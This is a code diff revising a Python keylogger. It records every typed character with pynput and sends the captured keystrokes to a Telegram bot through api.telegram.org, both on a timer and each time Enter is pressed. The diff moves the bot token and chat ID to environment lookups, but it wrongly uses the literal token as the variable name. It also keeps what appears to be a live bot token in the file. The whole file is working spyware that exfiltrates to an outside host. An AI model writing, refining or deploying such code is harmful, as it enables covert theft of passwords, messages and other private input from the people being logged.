@@ -1,70 +1,78 @@
 from pynput import keyboard
 import requests
-import time
 import threading
+import time
+import os
 
-# === CONFIGURATION - REPLACE THESE VALUES ===
-BOT_TOKEN = "8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE"  # Example: "123456789:ABCdefGhIJKlmNoPQrstUvWXyz"
-CHAT_ID = "7192294390"      # Example: "131933xxxx"
-# ============================================
+# === CONFIGURATION ===
+BOT_TOKEN = os.environ.get('8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE')
+CHAT_ID = os.environ.get('7192294390')
+# =====================
 
-# Buffer to store keystrokes
 keystroke_buffer = ""
-# Interval to send data (in seconds)
 SEND_INTERVAL = 60
 
 def send_to_telegram(message):
-    """Sends a message to the Telegram bot."""
+    """Sends cleaned message to Telegram"""
+    if not message.strip():
+        return
+        
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": CHAT_ID,
-        "text": message
-    }
+    data = {"chat_id": CHAT_ID, "text": f"📝 Keystrokes:\n{message}"}
+    
     try:
-        response = requests.post(url, data=data)
-        if response.status_code != 200:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        response = requests.post(url, data=data, timeout=10)
+        if response.status_code == 200:
+            print("[+] Logs sent to Telegram")
     except Exception as e:
-        print(f"Error sending message: {e}")
+        print(f"[-] Send error: {e}")
 
 def on_press(key):
-    """Callback function that runs whenever a key is pressed."""
+    """Handles key presses with clean output"""
     global keystroke_buffer
-
+    
     try:
-        # Handle special keys
+        # Handle character keys
         if hasattr(key, 'char') and key.char is not None:
             keystroke_buffer += key.char
-        else:
-            # Format special keys with brackets
-            key_name = str(key).replace("Key.", "[") + "]"
-            keystroke_buffer += key_name
-
-        # Optional: Send immediately when Enter is pressed
-        if key == keyboard.Key.enter:
+            
+        # Handle special keys - ONLY process Enter for new lines
+        elif key == keyboard.Key.enter:
             keystroke_buffer += "\n"
-            send_to_telegram(keystroke_buffer)
-            keystroke_buffer = ""
-
+            # Send immediately when Enter is pressed
+            if keystroke_buffer.strip():
+                send_to_telegram(keystroke_buffer)
+                keystroke_buffer = ""
+                
+        elif key == keyboard.Key.space:
+            keystroke_buffer += " "
+            
+        # IGNORE all other special keys (backspace, shift, ctrl, etc.)
+        # This creates clean, raw typing output
+        
     except AttributeError:
-        # Handle any unexpected key attributes
+        # Ignore any unexpected key attributes
         pass
 
-def report():
-    """Function to periodically send the keystroke buffer."""
+def periodic_send():
+    """Sends buffer periodically"""
     global keystroke_buffer
-    if keystroke_buffer:
+    if keystroke_buffer.strip():
         send_to_telegram(keystroke_buffer)
         keystroke_buffer = ""
-    # Set a timer to run this function again after the interval
-    timer = threading.Timer(SEND_INTERVAL, report)
-    timer.daemon = True
-    timer.start()
+    
+    threading.Timer(SEND_INTERVAL, periodic_send).start()
 
-# Start the periodic reporting
-report()
-
-# Start the keylogger listener
-with keyboard.Listener(on_press=on_press) as listener:
-    print("[+] Keylogger is now active. Press Ctrl+C to stop.")
-    listener.join()
+# Start the keylogger
+if __name__ == "__main__":
+    print("[*] Starting clean keylogger...")
+    print("[*] Special keys (backspace, arrows, etc.) are filtered out")
+    print("[*] Only characters, spaces, and Enter are recorded")
+    
+    periodic_send()
+    
+    with keyboard.Listener(on_press=on_press) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("\n[!] Keylogger stopped")
